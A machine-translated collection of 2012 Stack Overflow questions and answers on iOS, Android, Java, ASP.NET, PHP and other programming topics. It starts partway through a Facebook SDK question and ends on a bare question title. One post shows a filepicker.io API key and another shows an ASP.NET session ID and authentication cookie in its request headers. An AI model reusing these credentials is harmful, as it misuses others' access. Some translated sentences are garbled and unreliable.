上面的 Delegate 方法总是导致 Error code =5 facebook sdk error 。应该调用什么 API 才能使上面的图像发布在选定的朋友墙上。

请帮我.......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-09T05:49:25.433

最后，我可以在朋友墙上张贴图像。

**委托方法修改如下：--**

```
- (void)facebookViewControllerDoneWasPressed:(id)sender {

// we pick up the users from the selection, and create a string that we use to update the text view
// at the bottom of the display; note that self.selection is a property inherited from our base class
//UIImage *img = self.image;
FBSession.activeSession = appDelegate.session;
if (appDelegate.session.isOpen)
{            
    [FBSession openActiveSessionWithPermissions:[NSArray arrayWithObjects:@"publish_stream",@"user_photos",@"", nil]
                                   allowLoginUI:NO
                              completionHandler:^(FBSession *session,
                                                  FBSessionState status,
                                                  NSError *error) {

                                  if (error) {
                                      NSLog(@"error");
                                  } else {
                                      [FBSession setActiveSession:appDelegate.session];
                                  }
                              }];

    for (id<FBGraphUser> user in self.friendPickerController.selection) {   

        if (appDelegate.session.isOpen)
        {    

            FBSession.activeSession  = appDelegate.session; 
            NSMutableDictionary  *postVariablesDictionary = [[NSMutableDictionary alloc] init];
             [postVariablesDictionary setObject:self.image forKey:@"source"]; 
            // [postVariablesDictionary setObject:UIImagePNGRepresentation(self.image)  forKey:@"source"];
            [postVariablesDictionary setObject:@"my image" forKey:@"message"];
            NSLog(@"%@",user.id);
            [FBRequestConnection startWithGraphPath:[NSString stringWithFormat:@"%@/photos",user.id] parameters:postVariablesDictionary HTTPMethod:@"POST" completionHandler:^(FBRequestConnection *connection, id result, NSError *error) {
                [self showAlert:@"eCard Posted" result:result error:error];
            }];
        }    
        else 
        {
            if (appDelegate.session.state != FBSessionStateCreated) {
                // Create a new, logged out session.
                appDelegate.session = [[FBSession alloc] init];
            }            
            // if the session isn't open, let's open it now and present the login UX to the user
            [appDelegate.session openWithCompletionHandler:^(FBSession *session, 
                                                             FBSessionState status, 
                                                             NSError *error) {
            }];
        } 

    }

}
[self dismissModalViewControllerAnimated:YES]; 
```

}

问候和感谢....

# java - 追加一行数据到jtable

> ID：12760151
> 
> 赞同：-3
> 
> 时间：2012-10-06T13:19:55.293
> 
> 标签：java, swing, jtable, jcombobox

我正在使用 JTable 在 java swing 中做小项目。当用户从 JComboBox 中选择值时，我想将其添加到 JTable。我尝试了一些代码，但它不起作用。请给一些建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T13:21:26.183

关键在于您使用模型，最简单的解决方案是让您的 JTable 为其模型使用 DefaultTableModel 并调用其`addRow(...)`方法将“行”数据添加到 JTable。如果你看的话，在这个网站和其他网站上有很多这样的例子。

如果您需要更具体的帮助，那么可以，发布您的代码，包括不起作用的代码，并提出具体问题。最好发布一个[sscce](http://sscce.org)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T13:58:27.887

向您的表声明一个模型，然后使用该模型向表中添加行

```
DefaultTableModel dtm = new DefaultTableModel();
JTable table = new JTable(dtm);

// Add Columns
dtm.addColumn("Col1");
dtm.addColumn("Col2");

// Add row data
dtm.addRow(...);
dtm.addRow(...); 
```

阅读[DefaultTableModel](http://docs.oracle.com/javase/1.4.2/docs/api/javax/swing/table/DefaultTableModel.html)以了解它具有的不同方法。

# iphone - uitableviewcell 中的编辑模式仅适用于 ios 5.0

> ID：12760152
> 
> 赞同：4
> 
> 时间：2012-10-06T13:19:58.777
> 
> 标签：iphone, objective-c, ios, cocoa-touch, ios6

我做了一个自定义`tableviewcell`并覆盖了该方法
*-`(void) setEditing:(BOOL)editing animated:(BOOL)animated`*
以便为`UISwitch`编辑模式隐藏一个。

这是我的代码

```
-(void) setEditing:(BOOL)editing animated:(BOOL)animated
{
    [super setEditing:editing animated:animated];

    if (animated==YES) {
        // With animation
        if (editing == NO) {
            // Editing stopped
            [UIView animateWithDuration:0.3
                             animations:^{
                                  [self.alarmSwitch setAlpha:1.0];
                             }];
            [self.alarmSwitch setEnabled:YES];
        } else {
            // Editing started
             [UIView animateWithDuration:0.3 
                             animations:^{
                                  [self.alarmSwitch setAlpha:0.0];
                             }];
            [self.alarmSwitch setEnabled:NO];
        }
    } else {
        // Without animation
        // .................
    }
} 
```

在 ios 5.0 这工作。从 ios 5.1 及更高版本开始，它不再显示 alarmSwitch。这是一些屏幕截图。

1)**编辑模式**

![在此处输入图像描述](../Images/bd31be404f40c7c0ca391420dceb18d8.png)

2)**编辑后 (IOS 5.0)**

![在此处输入图像描述](../Images/e0d9441b79b7eb300936a54c6c0d99a4.png)

3)**编辑后（IOS 5.1 及更高版本）**

![在此处输入图像描述](../Images/f8b52829fcd75a141d031a6d46e8c5d2.png)

如果我向上滚动然后向下滚动（以便重新绘制单元格），则会再次显示该开关。有谁知道为什么会发生这种情况？奇怪的是，在 iOS 5.0 中，它就像一个魅力，而现在它不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-15T12:19:16.250

问题似乎是

```
[self.alarmSwitch setEnabled:NO]; 
```

和 setAlpha 动画。

解决问题的最简单方法是在 setAlpha 之前调用动画块内的 setEnabled 行，如下所示：

```
[UIView animateWithDuration:0.3
                         animations:^{
                             [self.alarmSwitch setEnabled:NO];
                             [self.alarmSwitch setAlpha:0.0];
                         }]; 
```

顺便说一句，你为什么还要将 enabled 属性设置为 NO？将 alpha 属性设置为 0 就足够了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-08T06:21:43.570

你在哪里调用 tableView 的 setEditing 方法？只需检查它是否在显示视图时被调用。

# javascript - filepicker.io 小部件在 chrome 和 IE 上不可见

> ID：12760154
> 
> 赞同：1
> 
> 时间：2012-10-06T13:20:06.587
> 
> 标签：javascript, iframe, filepicker.io

我正在尝试使用 filepicker.io 从用户网络摄像头录制视频并将其存储在我的 Amazon S3 存储桶中。

我被困在这里。下面的代码在 Firefox 中运行良好，但在 chrome 和 IE 上运行良好。abc iframe src 不是由 filepicker api 设置的，所以内容保持空白。我验证了 chrome 上启用了第 3 部分 cookie。任何帮助将不胜感激。

```
<html>
<head><title>Test</title></head>
<body>
<iframe id="abc" name="abc" height="500" width="500" frameborder="0"> abc </iframe>
<script src="https://api.filepicker.io/v0/filepicker.js"></script>
<script type="text/javascript"> 
filepicker.setKey("AeE9yA21xTpiOQ3JQm938z");
 // alert('before');
    filepicker.getFile(filepicker.MIMETYPES.ALL, {
    'multiple': false, 'container': 'abc',
    'services':[filepicker.SERVICES.VIDEO]
     }, function(response){
          alert(JSON.stringify(response));
     });
//  alert('end');
</script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-09T21:15:04.883

看起来 iframe 尚未包含在 DOM 中。当我将 javascript 代码放在 jquery 的 onReady 调用中时，它对我有用：

[http://www.filepicker.io/api/file/4wW3A6BwQYaPDNBENcau?dl=false](http://www.filepicker.io/api/file/4wW3A6BwQYaPDNBENcau?dl=false)

# objective-c - 在 xcode 中使用静态变量

> ID：12760166
> 
> 赞同：0
> 
> 时间：2012-10-06T13:21:36.053
> 
> 标签：objective-c, static

在我的项目中，我有一个搜索栏。

如果搜索栏中的文字发生了变化，我需要知道

所以我声明了两个静态 NSMutableString 进行比较如下

```
static NSMutableString *latestKeyWord;
static NSMutableString *secondaryKeyWord;
- (void)viewDidLoad
{
    [super viewDidLoad];
    [testViewController setSecondaryKeyWord:SBar.text];
    [testViewController setLatestKeyWord:SBar.text];
    [testViewController changeKeyWord];
}
    +(void)setSecondaryKeyWord:(NSMutableString*) text
{
    if (!secondaryKeyWord) {
        secondaryKeyWord = [NSMutableString stringWithCapacity:200];
    }
    [secondaryKeyWord setString:text];
}

+(void)setLatestKeyWord:(NSMutableString*)text
{
    if (!latestKeyWord) {
        latestKeyWord = [NSMutableString stringWithCapacity:200];
    }
    [latestKeyWord setString:secondaryKeyWord];
}

-(BOOL)changeKeyWord
{
    if ( ! [latestKeyWord isEqualToString:secondaryKeyWord]) {
         NSLog(@"changed");
        return TRUE;
    }else {
        NSLog(@"not change");
        return FALSE;
    }
} 
```

它刚刚进货，我不知道为什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-07T12:58:59.573

如果您想在文本字段中的文本更改时收到通知，您可以在文本字段中添加目标/操作：

```
@interface ViewController : UIViewController
@property (nonatomic) UITextField *field;
@property (nonatomic) NSString *searchText;
@end

@implementation ViewController
- (void)viewDidLoad
{
    [super viewDidLoad];
    CGRect frame = CGRectMake(50, 50, 200, 25);
    self.field = [[UITextField alloc] initWithFrame:frame];
    [self.field addTarget:self action:@selector(textChanged:) 
         forControlEvents:UIControlEventEditingChanged];
    [self.view addSubview:self.field];
}

- (void)textChanged:(id)sender {
    self.searchText = self.field.text;
    NSLog(@"Text changed to: %@", self.searchText);
    // restart searching here.
}
@end 
```

# delphi - Delphi上如何地理参考图像？

> ID：12760167
> 
> 赞同：2
> 
> 时间：2012-10-06T13:21:43.843
> 
> 标签：delphi, bitmap, kml

我有一个位图，我的用户在图像上设置了 2 个或更多标记，然后为任何标记设置纬度和经度。有了这个信息，我必须为 KML 文件创建一个地面叠加层，所以我需要知道如何计算 LatLonBox 参数：位图的北、南、东、西和旋转。

有任何想法吗？

这是结果的示例：

```
<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Folder>
    <name>Ground Overlays</name>
    <description>Examples of ground overlays</description>
    <GroundOverlay>
      <name>Large-scale overlay on terrain</name>
      <description>Overlay shows Mount Etna erupting on July 13th, 2001.</description>
      <Icon>
        <href>http://developers.google.com/kml/documentation/images/etna.jpg</href>
      </Icon>
      <LatLonBox>
        <north>37.91904192681665</north>
        <south>37.46543388598137</south>
        <east>15.35832653742206</east>
        <west>14.60128369746704</west>
        <rotation>-0.1556640799496235</rotation>
      </LatLonBox>
     </GroundOverlay>
  </Folder>
</kml> 
```

我的问题是北、南、东、西和旋转值。事实上，我的用户必须加载图像，然后他在其上放置 2 个或更多标记，并为所有标记设置纬度和经度。有了这些数据，我认为有可能获得北、南、东、西和旋转值，但我不知道如何。如果用户只放置 2 个标记，这很容易，我可以计算 dX 和 dY，然后计算北、南、东和西（在这种情况下，我设置旋转 = 0），但如果用户设置超过 2 个点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-08T08:08:29.147

这对于评论来说太长了，所以我将其写为答案（我确实尝试将其写为评论两次！）。首先让我们来处理您将在地图上获得的标记数量：在完美的世界中，您只需要两个标记，因为从几何上讲，它们是您随后导出地图上*任何*其他点的坐标所需的全部。这意味着第三个标记应该是*多余*的，它的精确坐标可以使用前两点的坐标来计算。您暗示使用第三点可以提取“旋转”，但这是完全错误的，因为地图是 2D 的！这是一个使用两点完美定义的旋转矩形示例：

**用户在地图上标记的内容：**

![在此处输入图像描述](../Images/f57a236bd1f3d517bf5c33e0883d40aa.png)

**如何解释该信息：** ![在此处输入图像描述](../Images/d87eae87150f0d2e6cb1637d04fcf540.png)

从同一个矩形中获得第三个点的那一刻，您就有机会进行一些“纠错”。假设您要提取矩形左上角的精确坐标。为了计算它，你只需要两点数学。当您获得 3 个点（我们称这些点为 A、B 和 C）时，您可以使用 3 个等式计算相同的坐标：

```
(A,B) => P1
(A,C) => P2
(B,C) => P3 
```

...而且您几乎可以保证为左上角的坐标获得 3 个不同的值（P1、P2 和 P3）！您现在需要应用一些纠错数学，以便将 3 个不同的值“合并”为一个值。这种纠错通常在现实世界中用于测地线（那些拿着黄色三脚架的人做测地线图，你会在所有建筑工地上看到他们）。如果您想要正确的解决方案，您可以研究它，或者您可以简单地平均 3 个值并完成它，它很可能足以满足您的需求。

请求的输出 XML 似乎使用 TOP、BOTTOM、LEFT、RIGHT 和 ROTATION 坐标定义图像矩形。为了将您的坐标转换为该格式，您需要弄清楚目标软件对 XML 的作用。如果我猜测它会是这样的：图像首先放置在地图上由上/下/左/右坐标定义的空间中，然后旋转给定的数量。如果这是真的，这就是我准备你的位图的方法：

1.  首先确定左上角、右上角和右下角的坐标。到目前为止，应该清楚两点就足够了，但如果你得到多于两点，请找出一个纠错方案并使用所有点来获得更高的精度。
2.  使用左上角和右上角坐标计算您当前的旋转。
3.  找出目标软件使用的旋转中心点的坐标。目标软件是否围绕其中心旋转图像？它是否围绕左上角旋转图像？无论如何，计算该点的坐标。
4.  使用您在 (2) 处获得的旋转角度围绕您在 (3) 处计算的 CENTER 旋转您的坐标，以使您的图像平行于水平轴。
5.  从旋转的左上角向北和向西走，从右下角向南和向东走。你在 (2) 处得到了旋转角度，所以现在你已经有了一个完整的解决方案。

# selenium - 使用 Selenium 和 TeamCity 进行测试自动化

> ID：12760172
> 
> 赞同：1
> 
> 时间：2012-10-06T13:23:23.093
> 
> 标签：selenium, teamcity, functional-testing

我正在尝试使用 TeamCity 设计一个跨浏览器的 Web 应用程序构建自动化，它会执行以下操作：

1.  从 VCS 获取资源
2.  构建网络应用程序
3.  将应用部署到测试服务器
4.  在安装了适当浏览器（版本）的多个虚拟机/构建代理上运行测试
5.  如果一切顺利，部署到登台服务器（用于人工测试）

我对第 4 步有点困惑。这绝非易事，而且我已经发现会有单独的构建配置，因此每个都可以在单独的构建代理上运行，但这就是我失去它的地方。

是否可以构建这样的配置，或者我是否必须安排分别在不同构建代理上运行的测试构建配置？

另一个问题是 - 我如何获得构建配置以将使用其他配置构建的内容复制到运行构建的代理？

我的意思是 - 到目前为止，我只使用构建代理来实际构建一些东西，并有选择地对刚刚构建的东西运行单元测试，但这引入了另一个维度，我不确定它是否可能。

谢谢v。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-12T08:01:01.617

我在 javaScript 测试中遇到了这个问题。为此，我不需要先复制到远程服务器。

我的解决方案是使用 Qunit 和 NQUnit。然而 NQUnit 与 Watin 有一个硬编码的关系，它只支持 IE。

所以我得到了 NQUnit 的源代码，并相当简单地将其更改为使用 Selenium Web 驱动程序。我现在可以运行触发 NQunit 的 ac# 单元测试，它反过来触发每个浏览器并返回每个浏览器测试的结果。

这意味着只有一个构建代理实例。

# matlab - Scilab 几个自定义函数

> ID：12760174
> 
> 赞同：0
> 
> 时间：2012-10-06T13:23:53.827
> 
> 标签：matlab, scilab

我在不同的 .sci 文件中有几个函数。此外，这些文件位于不同的目录中。这些函数由主程序使用。对于旧`Scilab`版本，我习惯于`getf(...)`加载所有函数（`getf(...)`当然，每个函数一个）并`getf(...)`加载主程序。

问题是：

*   如何将主程序和所有功能加载到`Scilab`新版本/环境中？
*   Matlab 呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-23T13:51:14.817

*exec*替换*gef*： [http ://help.scilab.org/docs/current/en_US/exec.html](http://help.scilab.org/docs/current/en_US/exec.html)

但是如果你开始编写一个 Scilab 模块（扩展），你应该看看 Scilab 提供的工具箱骨架。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T08:04:48.500

正如 Sylvestre 在 Scilab 中指出的那样，`exec()`您使用模块的文件名进行调用。

在 Matlab 中，它不是直接可比较的操作（这是它们分歧的领域之一）：您将每个外部函数放在文件名与函数名匹配的文件中，然后将该文件放在路径中：当您调用函数时，Matlab 搜索路径用于匹配文件。这确实意味着每个文件只能有一个函数，但如果你想要 C 风格的功能，[这个线程](http://www.mathworks.com/matlabcentral/newsreader/view_thread/160868)`#include`上有各种方法。

出于您的目的 - 多个目录 - 您可能希望将每个相关目录添加到您的 startup.m 文件中的路径。另请参阅[如何使用 MATLAB 搜索路径](https://stackoverflow.com/questions/2129646/how-to-use-the-matlab-search-path)。

# android - Android广播接收器内的线程

> ID：12760180
> 
> 赞同：2
> 
> 时间：2012-10-06T13:25:12.363
> 
> 标签：android, multithreading, broadcastreceiver, looper

我得到一个 DownloadManager.ACTION_DOWNLOAD_COMPLETE 广播后，我需要提取 zip 文件并填充我编写的代码来完成我的工作的数据库。但是我必须在这里启动线程来处理文件提取和插入数据库。

我知道无法在广播接收器中启动线程。如果任何机构遇到问题，请提出解决方案..因为我的工作需要时间插入，所以我不想等待并坚持下去。

我在广播接收器中运行线程时遇到异常，并且

编写此代码也无法在广播接收器中工作

```
BroadcastReceiver onComplete = new BroadcastReceiver() {
    public void onReceive(Context ctxt, Intent intent) {

        /*
         * check status message whether the last queue is successful and
         * completed and then stop self
         */
        if (DownloadManager.ACTION_DOWNLOAD_COMPLETE.equals(intent.getAction())) {
            Intent mIntent = new Intent(downloadmanager1.this, DBService.class);
            mIntent.putExtra("messenger", new Messenger(mHandler));
            mIntent.putExtra("enqueue", enqueue);
            ctxt.startService(mIntent);
          //  ctxt.startService(mIntent);
        }
    } 
```

注意 - 没有异常或错误通过，并且在调试时在 DDMS 中也没有启动任何 Intentservice
};

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T13:27:28.810

步骤#1：编写一个`IntentService`“处理文件提取和插入数据库”的工作。

第 2 步：调用`startService()`from`onReceive()`以`BroadcastReceiver`将控制权传递给`IntentService`.

# sencha-touch-2 - Ext.application startupImage

> ID：12760184
> 
> 赞同：0
> 
> 时间：2012-10-06T13:25:36.837
> 
> 标签：sencha-touch-2

我从 Sencha Touch 2.1 中的 Carousel 示例开始。在 app.js 文件中，我看到了“startupImage”属性，它定义了我们想要使用的不同大小的图像。然而，我似乎找不到任何关于这个属性的文档。在文档中，他们讨论了 Apple iOS 世界特有的“”和“”。但是如果我们使用 Sencha Touch，那是因为我们不想被绑定到特定的公司（这似乎很明显）。

我想知道的是，它是如何工作的？有2个参数，一个是分辨率，第二个是png文件的路径。我们可以修改第一个参数还是必须制作适合这些数字的 png 文件？

```
Ext.application({    

    name: 'TestSencha',

    requires: [
        'Ext.MessageBox'
    ],

    views: ['Main', 'PicViewer', 'Extras'],

    icon: {
        '57': 'resources/icons/Icon.png',
        '72': 'resources/icons/Icon~ipad.png',
        '114': 'resources/icons/Icon@2x.png',
        '144': 'resources/icons/Icon~ipad@2x.png'
    },

    isIconPrecomposed: true,

   startupImage: {
       '320x460': 'resources/startup/320x460.jpg',
       '640x920': 'resources/startup/640x920.png',
       '768x1004': 'resources/startup/768x1004.png',
       '748x1024': 'resources/startup/748x1024.png',
       '1536x2008': 'resources/startup/1536x2008.png',
       '1496x2048': 'resources/startup/1496x2048.png'
    },

// rest of code goes here.... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-08T18:50:41.940

我建议您查看ST2 SDK 中的**src/core/Ext-more.js**。

基本上它会扫描`startupImage`应用程序配置中定义的内容并测试设备的操作系统及其设备比率，然后像这样调用 addStartupImage

```
if (Ext.os.is.iPad) {
    if (devicePixelRatio >= 2) {
        // Retina iPad - Landscape
        if ('1496x2048' in startupImage) {
            addStartupImage(startupImage['1496x2048'], '(orientation: landscape)');
        }
... 
```

这是`addStartupImage`：

```
function addStartupImage(href, media) {
    var link = document.createElement('link');
    link.setAttribute('rel', 'apple-touch-startup-image');
    link.setAttribute('href', href);
    if (media) {
        link.setAttribute('media', media);
    }
    head.append(link);
} 
```

这是解释。

希望这可以帮助

# asp.net - 使用asp.net HTTPHandler 实现自己的代码，然后调用它的默认实现？

> ID：12760185
> 
> 赞同：2
> 
> 时间：2012-10-06T13:25:45.477
> 
> 标签：asp.net, http, httphandler, httpresponse

我遇到了一些问题，我在 web.config 文件中创建了一个类型，用作 aspx 的 HTTPHandler，代码..

```
<add path="*.aspx" verb="*" type="myHandler"></add> 
```

cs页面是

```
public class myHandler :  IHttpHandler
{
    public void ProcessRequest(System.Web.HttpContext context) 
    {
        // check if client browser can accept gzip encoding
        string AcceptEncoding = context.Request.Headers["Accept-Encoding"];
        if (!string.IsNullOrEmpty(AcceptEncoding) && AcceptEncoding.Contains("gzip"))
        {
            // if yes, apply it
            context.Response.Filter = new GZipStream(context.Response.Filter, CompressionMode.Compress);
            context.Response.AddHeader("Content-Encoding", "gzip");
        }
        // don't do anything else, just let the default page handling work
    }

    public bool IsReusable
    {
        get { return false; }
    }

} 
```

如您所见，我正在检查客户端是否接受 gzip 编码，如果是，请添加它，并让默认进程处理...... **但**我得到的响应是......

```
XML Parsing Error: no element found
Location: http://localhost:49903/Masters/Default.aspx
Line Number 1, Column 1:
^ 
```

每个页面都返回此错误？我猜想在我的处理程序中处理了请求后，它会以某种方式清除其他所有内容或相关内容。

萤火虫显示以下..

```
Response Headers

Cache-Control   private
Connection  Close
Content-Encoding    gzip
Content-Length  0
Date    Sat, 06 Oct 2012 13:14:50 GMT
Server  ASP.NET Development Server/10.0.0.0
X-AspNet-Version    4.0.30319

Request Headers

Accept  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding gzip, deflate
Accept-Language en-us,en;q=0.5
Connection  keep-alive
Cookie  ASP.NET_SessionId=1wfoaqta3mosntii1c3ual1i; .ASPXAUTH=D41BBDC2CCF15048BB5A345EBBFBC63EAE35FD37E2F1F170C1D68495477889A989353D4EB30F2B9A723F83C21293A47478B654A1BD2453BCF032DC539427EA0E519D2FEE70DB7660F00AA90E159633C4
Host    localhost:49903
Referer http://localhost:49903/Masters/Default.aspx
User-Agent  Mozilla/5.0 (Windows NT 5.1; rv:15.0) Gecko/20100101 Firefox/15.0.1

Request Headers From Upload Stream

Content-Length  8241
Content-Type    multipart/form-data; boundary=---------------------------2995119424827 
```

所以，从我的猜测来看，我想知道有没有一种方法可以在我按照我的方式处理页面之后，我可以做类似`base.ProcessRequest()`. 我知道这是不可能的，因为我正在实现一个接口而不是从一个类派生，但我想知道，在完成我的页面后，如何让 asp.net 引擎处理页面？

**注意**这个问题不是关于实现 gzib 编码，我知道我可以在 web 配置中设置它，在每个页面上，在 IIS 中，在实用程序类中创建一个静态函数并调用它，以及许多其他的东西。但同样，请不要回答我可以使用不同的方式来实现这个 gzip 编码，*我知道我可以*，我关心的是如何让 asp.net 做它的默认处理（或任何可能的意思）之后我完成了我的自定义处理？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:03:49.207

你走错了路。您尝试使用的处理程序是为处理以不同扩展名结尾的某种文件提供一种完全不同的方式，方法是添加`.aspx`然后您处理该页面并且根本不允许 asp.net 处理这些页面。

你应该做的是制作一个`httpModule`，例如一个像这样的类：

```
public class gZipModule : IHttpModule
{
    void IHttpModule.Init(HttpApplication context)
    {
        context.BeginRequest += new EventHandler(context_BeginRequest);
    }

    void IHttpModule.Dispose()
    {
    }

    private void context_BeginRequest(object sender, EventArgs e)
    {
        // gzip here
    }
} 
```

在网络配置上：

```
<httpModules>
   <add type="gZipModule"  name="gZipModule" />
</httpModules> 
```

或者更简单，在gZip上`global.asax`制作`Application_BeginRequest`

```
protected void Application_BeginRequest(Object sender, EventArgs e)
{
    // check if the file is .aspx, then make gzip
    string cTheFile = HttpContext.Current.Request.Path;
    string sExtentionOfThisFile = System.IO.Path.GetExtension(cTheFile);

    if (sExtentionOfThisFile.Equals(".aspx", StringComparison.InvariantCultureIgnoreCase))
    {   
        // now make gZip
    }
} 
```

# android - 使用 Android 设备的摄像头作为活动的背景

> ID：12760195
> 
> 赞同：4
> 
> 时间：2012-10-06T13:26:45.560
> 
> 标签：android, android-camera, augmented-reality

因为我在使用 AndEngine 的增强现实示例时遇到了困难。我想以我自己的方式去做。我想访问我的 Android 设备的摄像头并将其用作我活动的背景。它仍然像一个增强现实。稍后我将添加精灵。JAVA 和 XML 的代码是什么？清单中是否有任何变化？谢谢你！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-03T12:06:17.333

你必须使用相机背景（[**这里**](http://ibuzzlog.blogspot.tw/2012/08/how-to-use-camera-in-android.html)是教程）并在一些渲染库的帮助下放置精灵。我使用[**Jpct-ae**](http://jpct.net/jpct-ae/)，它很容易集成并且有一个很棒的[**论坛**](http://www.jpct.net/forum2/index.php?board=3.0)。[**为了获得更多的增强现实效果，您可以在此处**](https://stackoverflow.com/questions/2881128/how-to-use-onsensorchanged-sensor-data-in-combination-with-opengl)将传感器值应用于精灵问题[](https://stackoverflow.com/questions/2881128/how-to-use-onsensorchanged-sensor-data-in-combination-with-opengl)

 *** * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T14:53:13.830

您必须使用相机控制 API 以及称为 surfaceView 的东西来满足您的需要。以下是帮助您入门的资源：

[http://mobile.tutsplus.com/tutorials/android/android_augmented-reality/](http://mobile.tutsplus.com/tutorials/android/android_augmented-reality/) http://www.devx.com/wireless/Article/42482 [http://developer.android.com/training/camera/cameradirect.html](http://developer.android.com/training/camera/cameradirect.html) http://developer.android.com/reference/android/view/SurfaceView.html

祝你好运！**

# javascript - HTML画布游戏循环

> ID：12760199
> 
> 赞同：0
> 
> 时间：2012-10-06T13:27:34.777
> 
> 标签：javascript, animation, canvas

我在实现具有生命周期的粒子系统时遇到问题。问题是当我的粒子系统运行时，有时当我尝试创建粒子生命时它会冻结 1-2 秒。

我有这样的东西（所有粒子都有 life=2 and end_time=1）

这是代码：http: [//jsbin.com/eqexoj/3/](http://jsbin.com/eqexoj/3/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-07T00:04:06.810

我似乎无法查看您发布的代码；对我来说超时。

我建议的最有可能的事情是考虑垃圾收集。

这是我写的一篇关于这个主题的文章。 [http://buildnewgames.com/garbage-collector-friendly-code/](http://buildnewgames.com/garbage-collector-friendly-code/)

# php - 从通过 PHP 执行的 traceroute 输出解析数据

> ID：12760201
> 
> 赞同：0
> 
> 时间：2012-10-06T13:27:51.777
> 
> 标签：php, linux, preg-match, traceroute

我的主要目的是解析通过 PHP 执行的 traceroute 命令返回的数据

```
$output = shell_exec("traceroute www.xxx.com");
echo $output; 
```

返回的输出是这样的

追踪路线到

```
www.x.com [173.xx.xx.xx] over a maximum of 30 
hops: 1 1 ms <1 ms <1 ms 192.168.1.1 2 10 ms 10 ms 10 ms 117.xx.xx.xx 
3 11 ms 9 ms 9 ms 218.xx.xx.xx 4 10 ms 11 ms 10 ms 218.xx.xx.xx 5 216 ms 220 
ms 229 ms 59.xx.xx.xx.static.xx.xx.xx [59.xx.xx.xx] 6 203 ms 203 ms 219 ms 
121xx.xx.xx
7 328 ms 371  ms 325 ms 72.xx.xx.xx 8 301 ms 306 ms 313 ms 72.xx.xx.xx 9 
249 ms 251 ms249 ms 72.xx.xx.xx 10 256 ms 254 ms 255 ms sin04s02xx.xx.xx
[173.xx.xx.xx] Trace complete. 
```

我想每次解析或获取输出，

我试过这个

```
traceroute www.google.com 2>/dev/null | awk 'NR==1

{ print $5;
   exit;
} 
```

这给了我我认为的最大跳数。如果有类似的命令来获取单个输出，例如

```
1 1 ms <1 ms <1 ms 192.168.1.1
2 10 ms 10 ms 10 ms 117.xx.xx.xx
3 11 ms 9 ms 9 ms 218.xx.xx.xx 
```

也许我可以将它包含在一个循环中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:40:52.543

你可以使用`popen()`：

```
$handle = popen("traceroute www.xxx.com 2>&1", "r");
while(!feof($handle)) {
    $buffer = fgets($handle);
    $buffer = "<p>".$buffer."</p>\n";
    echo $buffer;
}
pclose($handle); 
```

# java - Java在数组中保存3个值

> ID：12760203
> 
> 赞同：0
> 
> 时间：2012-10-06T13:27:56.690
> 
> 标签：java, arrays, collections, arraylist

我需要一个数组对象，它应该包含 3 个对象。

起初是使用`Collection`，但我需要添加到特定的地方。例如：

```
CollectionObject.add(pos, myObject) 
```

然后我去了`ArrayList`，创建了这样的对象：

```
ArrayList<MyObject> array = new ArrayList<MyObject>(); 
```

创建它时，它会创建大小为 1 的数组，但我需要添加到位置 0-2，因此添加如下：

```
array.add(2, myObject) 
```

我有 ：

```
 java.lang.IndexOutOfBoundsException: Index: 2, Size: 1 
```

我的解决方案是，创建 arraylist，向其中添加 3 个空对象，然后覆盖，但还有更微妙的解决方案吗？有没有更好的数组保存对象，比如`Vector`什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T13:31:30.933

改为使用 3 个元素的数组，如下所示：

```
MyObject [] array = new MyObject[3];
array[2] = myObject; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T13:32:20.560

`ArrayList`不是数组，它是`List`使用隐藏数组实现的。您需要向其中添加三个项目，然后才能按索引处理项目，如下所示：

```
ArrayList<MyObject> array = new ArrayList<MyObject>(3);
array.add(null);
array.add(null);
array.add(null);
array.set(2, myObject) 
```

`ArrayList`s 自动增长。如果您不需要此功能，请使用普通数组，例如，如下所示：

```
MyObject array = new MyObject[] {myObject1, myObject2, myObject3}; 
```

现在您可以使用索引运算符替换项目：

```
array[2] = newMyObject; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T13:33:22.873

```
MyObject[] a = new MyObject[3];
a[2] = new MyObject(); 
```

# android - 为什么我的 Android 应用程序在方向更改时崩溃？

> ID：12760206
> 
> 赞同：0
> 
> 时间：2012-10-06T13:28:48.330
> 
> 标签：android, xml, layout

对于我的主要活动，我有两个布局文件。一种用于纵向模式，另一种用于横向模式。这些是我的 xml 文件的位置。

对于纵向模式：

```
res/layout/activity_main.xml 
```

对于横向模式：

```
res/layout-land/activity-main.xml 
```

我已经测试了这些配置，它们可以在更高级别的 Android 设备上完美运行。问题是，例如，在 Android 1.6 上，应用程序在切换到横向模式时会崩溃。这里有什么问题？有解决方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:26:18.770

将 layout-land 中 xml 文件的名称更改为

```
res/layout-land/activity_main.xml 
```

名称不匹配，因此出现错误。将其从更改`activity-main.xml`为`activity_main.xml`（用取消划线替换连字符）。你现在应该没事了。

# iphone - 如何从 iOS 中 Web 服务响应的输出中获取电子邮件和密码值？

> ID：12760208
> 
> 赞同：0
> 
> 时间：2012-10-06T13:29:08.783
> 
> 标签：iphone, ios

